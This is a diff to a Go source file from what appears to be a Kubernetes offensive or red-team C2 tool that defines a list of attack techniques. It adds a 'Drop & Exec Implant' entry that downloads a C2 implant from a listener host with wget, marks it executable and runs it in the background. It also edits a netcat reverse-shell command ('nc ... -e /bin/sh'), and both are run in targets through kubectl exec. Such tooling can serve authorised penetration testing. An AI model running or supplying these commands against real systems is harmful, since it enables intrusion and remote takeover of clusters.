@@ -117,12 +117,21 @@ func LoadArmory(dir string) (Armory, error) {
 			Command:     domain.StartC2Redirector{DstPort: 1337},
 		},
 		{
+			Name:        "Drop & Exec Implant",
+			Description: "Command to download a prepared C2 implant and execute it to establish a session",
+			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
+			Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
+			CommandFn: func(t domain.TTP) domain.Message {
+				return &domain.ExecTTP{TTP: t, Cmd: t.Cmd, Target: &domain.Target{}, C2Channel: KubectlExecCmd{}}
+			},
+		},
+		{
 			Name: "Check Token permissions",
 		},
 		{
 			Name:        "Kubectl Exec simple shell",
 			Description: "Use kubectl exec to establish a simple shell",
-			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh",
+			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh &",
 			CommandFn: func(t domain.TTP) domain.Message {
 				return &domain.ExecTTP{TTP: t, Cmd: t.Cmd, Target: &domain.Target{}, C2Channel: KubectlExecCmd{}}
 			},
